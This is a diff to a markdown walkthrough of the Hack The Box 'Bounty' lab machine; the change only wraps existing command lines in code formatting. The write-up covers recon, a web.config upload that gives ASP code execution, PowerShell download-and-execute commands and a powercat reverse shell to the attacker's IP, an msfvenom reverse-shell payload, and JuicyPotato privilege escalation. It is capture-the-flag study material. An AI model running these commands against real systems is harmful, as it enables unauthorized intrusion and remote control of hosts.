@@ -2,17 +2,19 @@
 
 # ${{\color{purple}Initial Recon}}\ $
 
-nmap -sC -sV -oA bounty 10.10.10.93
-80/tcp open  http    Microsoft IIS httpd 7.5
+``nmap -sC -sV -oA bounty 10.10.10.93``
 
-dirb http://10.10.10.93/ -w /usr/share/wordlists/dirb/common.txt
-gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx,asp
+``80/tcp open  http    Microsoft IIS httpd 7.5``
+
+``dirb http://10.10.10.93/ -w /usr/share/wordlists/dirb/common.txt``
+
+``gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx,asp``
 
 # ${{\color{purple}Initial Foothold}}\ $
 
 ### My goubster command allowed me to find the file /transfer.apsx which allows to upload on the server **:white_check_mark:**
 
-gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx,asp
+``gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 30 -x aspx,asp``
 
 ![1](https://user-images.githubusercontent.com/123066149/220401946-fe0162ee-df1e-464c-a47e-e15b6e1fbd5e.PNG)
 
@@ -33,7 +35,7 @@ gobuster dir -u http://10.10.10.93 -w /usr/share/wordlists/dirbuster/directory-l
 
 https://book.hacktricks.xyz/pentesting-web/file-upload
 
-ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml
+``ASP: .asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml``
 
 ![image](https://user-images.githubusercontent.com/123066149/220445347-d01adb51-b57f-45f5-b5b2-5ba5dbe30298.png)
 
@@ -63,7 +65,7 @@ https://soroush.secproject.com/blog/2019/08/uploading-web-config-for-fun-and-pro
 ### The number 15 is there so there is a code execution now I have to change the ASP code :
 ### I use the code of the web.aspx console and I test the code execution on my computer with the ping command :
 
-cat web.aspx
+``cat web.aspx``
 
 ![image](https://user-images.githubusercontent.com/123066149/220453123-12652682-7e90-40c2-a123-6101beb1cf30.png)
 
@@ -91,11 +93,11 @@ cat web.aspx
 
 
 
-Set cmd = s.Exec ("cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Invoke-PowerShellTcp.ps1')")
+``Set cmd = s.Exec ("cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Invoke-PowerShellTcp.ps1')")``
 
 ### OR 
 
-Set cmd = s.Exec("cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Nishangrev.ps1')")
+``Set cmd = s.Exec("cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:80/Nishangrev.ps1')")``
 
 
 ![image](https://user-images.githubusercontent.com/123066149/220458571-e8616ef9-0daf-4c41-9e7a-8ae8944032b1.png)
@@ -118,49 +120,55 @@ Set cmd = s.Exec("cmd.exe /c powershell.exe -c IEX(New-Object Net.WebClient).dow
 ### I decide to redirect the shell to a classical cmd shell because the porwershell shell prevents me from executing binaries 
 ### For this I use powercat:
 
-IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5:80/powercat.ps1');powercat -c 10.10.16.5 -p 4444 -e cmd.exe
+``IEX (New-Object System.Net.Webclient).DownloadString('http://10.10.16.5:80/powercat.ps1');powercat -c 10.10.16.5 -p 4444 -e cmd.exe``
 
 ![image](https://user-images.githubusercontent.com/123066149/220460046-bbfdde15-e010-4355-8b1d-ea52562a1bca.png)
 
 ### I used FTP/WGET/powershell Invoke-WebRequest : but nothing worked for the download of my tools the only solution that works is the SMB share :
 
 -----------FTP------------------
-echo open 10.10.16.5 21> ftp.txt
-echo USER offsec>> ftp.txt
-echo lab>> ftp.txt
-echo bin>> ftp.txt
-echo GET Juicy_Potato_x86.exe>> ftp.txt
-echo bye>> ft4.txt
+``echo open 10.10.16.5 21> ftp.txt``
 
-ftp -v -n -s:ftp.txt
+``echo USER offsec>> ftp.txt``
+
+``echo lab>> ftp.txt``
+
+``echo bin>> ftp.txt``
+
+``echo GET Juicy_Potato_x86.exe>> ftp.txt``
+
+``echo bye>> ft4.txt``
+
+``ftp -v -n -s:ftp.txt``
 
 -----------PowerShell------------------
-powershell Invoke-WebRequest -Uri http://10.10.16.5:80/nc.exe -OutFile C:\Users\Public\Downloads\nc.exe
+
+``powershell Invoke-WebRequest -Uri http://10.10.16.5:80/nc.exe -OutFile C:\Users\Public\Downloads\nc.exe``
 
 -----------WGET------------------
-wget "http://10.10.16.5:80/nc.exe" -outfile "nc.exe"
+``wget "http://10.10.16.5:80/nc.exe" -outfile "nc.exe"``
 
 -----------SMBSERVER-IMPACKET------------------
 
-/usr/bin/impacket-smbserver kali .
+``/usr/bin/impacket-smbserver kali .``
 
 ![image](https://user-images.githubusercontent.com/123066149/220461207-fef86ba1-5d0b-431d-86f1-add5683ec68d.png)
 
-msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=4321 -f exe -o exploit.exe
+``msfvenom -p windows/shell_reverse_tcp LHOST=10.10.16.5 LPORT=4321 -f exe -o exploit.exe``
 
 ![image](https://user-images.githubusercontent.com/123066149/220463126-0a99d74d-bd0d-4b6b-8fac-d314f06ae337.png)
 
 ### I use this command to copy the binaries to the machine :
 
-copy \\10.10.16.5\kali\exploit.exe
+``copy \\10.10.16.5\kali\exploit.exe``
 
-copy \\10.10.16.5\kali\JuicyPotato.exe
+``copy \\10.10.16.5\kali\JuicyPotato.exe``
 
 ![image](https://user-images.githubusercontent.com/123066149/220463530-b6a46bda-37d1-49ca-9a77-450d357525ed.png)
 
-JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -t * -p whoami
+``JuicyPotato.exe -l 1337 -c "{9B1F122C-2982-4e91-AA8B-E071D54F2A4D}" -t * -p whoami``
 
-JuicyPotato.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\Users\merlin\Desktop\exploit.exe  -t *
+``JuicyPotato.exe -l 1337 -c "{659cdea7-489e-11d9-a9cd-000d56965251}" -p c:\Users\merlin\Desktop\exploit.exe  -t *``
 
 ![7](https://user-images.githubusercontent.com/123066149/220464952-ac63e66e-e994-4ade-9be4-abfb27857c86.PNG)
 
